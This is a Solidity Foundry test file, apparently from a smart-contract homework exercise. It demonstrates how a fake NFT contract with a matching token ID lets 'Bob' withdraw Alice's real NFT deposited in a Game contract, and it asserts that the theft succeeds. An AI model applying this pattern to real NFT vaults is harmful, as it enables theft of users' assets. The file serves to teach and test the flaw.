// SPDX-License-Identifier: MIT

pragma solidity >= 0.8.25 <0.9.0;

import { Test } from "forge-std/src/Test.sol";
import { FakeAttackerNFT } from "../../src/homework4/FakeAttackerNFT.sol";
import { Game, MyNFT } from "../../src/homework4/Game.sol";

contract GameTest is Test {
    Game internal game;
    MyNFT internal myNFT;
    FakeAttackerNFT internal fakeAttackerNFT;

    function setUp() public {
        myNFT = new MyNFT();
        game = new Game(myNFT);

        fakeAttackerNFT = new FakeAttackerNFT();
    }

    function test_withFakeAttackerNFT() public {
        // Assume address 1 is Alice, and address 2 is Bob
        myNFT.safeTransferFrom(address(this), address(1), 10);
        fakeAttackerNFT.safeTransferFrom(address(this), address(2), 10);
        assertEq(myNFT.ownerOf(10), address(1));
        assertEq(fakeAttackerNFT.ownerOf(10), address(2));

        // Alice deposits NFT to Game contract
        vm.startPrank(address(1));
        myNFT.safeTransferFrom(address(1), address(game), 10);
        assertEq(myNFT.ownerOf(10), address(game));
        vm.stopPrank();

        // Bob steals original NFT from Alice
        vm.startPrank(address(2));
        fakeAttackerNFT.safeTransferFrom(address(2), address(game), 10);
        game.withdraw(10);
        assertEq(myNFT.ownerOf(10), address(2));
        vm.stopPrank();

        /**
         * In this case, Bob successfully steals the original NFT from Alice by sacrificing his fakeNFT to
         * the Game contract.
         */
    }
}
